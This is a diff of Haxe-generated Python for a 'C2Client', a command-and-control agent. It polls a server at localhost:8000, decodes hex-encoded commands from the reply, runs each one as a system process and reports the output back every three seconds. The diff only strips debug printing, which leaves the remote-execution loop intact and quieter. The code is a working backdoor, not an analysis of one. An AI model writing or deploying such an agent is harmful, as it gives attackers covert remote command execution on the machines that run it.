@@ -93,18 +93,12 @@ class C2Client:
         C2Client.return_values = []
         try:
             res = sys_Http.requestUrl(((("http://localhost:8000/asdf?code=" + HxOverrides.stringOrNull(C2Client.code)) + "&ret=") + ("null" if ret is None else ret)))
-            _hx_str = Std.string(("res:" + ("null" if res is None else res)))
-            python_Lib.printString((("" + ("null" if _hx_str is None else _hx_str)) + HxOverrides.stringOrNull(python_Lib.lineEnd)))
             C2Client.onResponse(res)
         except BaseException as _g:
-            e = haxe_Exception.caught(_g)
-            print(str(e.get_message()))
             C2Client.onFailed()
 
     @staticmethod
     def onResponse(data):
-        _hx_str = Std.string(("result: " + ("null" if data is None else data)))
-        python_Lib.printString((("" + ("null" if _hx_str is None else _hx_str)) + HxOverrides.stringOrNull(python_Lib.lineEnd)))
         if ((HxString.substring(data,0,len("coms: [")) == "coms: [") and ((HxString.substring(data,(len(data) - 1),len(data)) == "]"))):
             data = HxString.substring(data,len("coms: ["),(len(data) - 1))
             if (data != ""):
@@ -113,13 +107,9 @@ class C2Client:
                     return haxe_io_Bytes.ofHex(s).toString()
                 parsed_coms = list(map(_hx_local_0,split_coms))
                 if (len(parsed_coms) > 0):
-                    _hx_str = Std.string(("parsed_coms: " + Std.string(parsed_coms)))
-                    python_Lib.printString((("" + ("null" if _hx_str is None else _hx_str)) + HxOverrides.stringOrNull(python_Lib.lineEnd)))
                     def _hx_local_1(s):
                         return sys_io_Process(s).stdout.readAll().toString()
                     C2Client.return_values = list(map(_hx_local_1,parsed_coms))
-                    _hx_str = Std.string(("return_values: " + Std.string(C2Client.return_values)))
-                    python_Lib.printString((("" + ("null" if _hx_str is None else _hx_str)) + HxOverrides.stringOrNull(python_Lib.lineEnd)))
         timer = haxe_Timer(3000)
         def _hx_local_2():
             C2Client.doCallback()
@@ -1458,20 +1448,6 @@ class python_HaxeIterator:
             self.checked = True
         return self.has
 
-
-
-class python_Lib:
-    _hx_class_name = "python.Lib"
-    __slots__ = ()
-    _hx_statics = ["lineEnd", "printString"]
-
-    @staticmethod
-    def printString(_hx_str):
-        encoding = "utf-8"
-        if (encoding is None):
-            encoding = "utf-8"
-        python_lib_Sys.stdout.buffer.write(_hx_str.encode(encoding, "strict"))
-        python_lib_Sys.stdout.flush()
 
 
 class python_internal_ArrayImpl:
@@ -2919,7 +2895,6 @@ C2Client.return_values = []
 C2Client.code = "client"
 python_Boot.keywords = set(["and", "del", "from", "not", "with", "as", "elif", "global", "or", "yield", "assert", "else", "if", "pass", "None", "break", "except", "import", "raise", "True", "class", "exec", "in", "return", "False", "continue", "finally", "is", "try", "def", "for", "lambda", "while"])
 python_Boot.prefixLength = len("_hx_")
-python_Lib.lineEnd = ("\r\n" if ((Sys.systemName() == "Windows")) else "\n")
 sys_Http.PROXY = None
 
 C2Client.main()
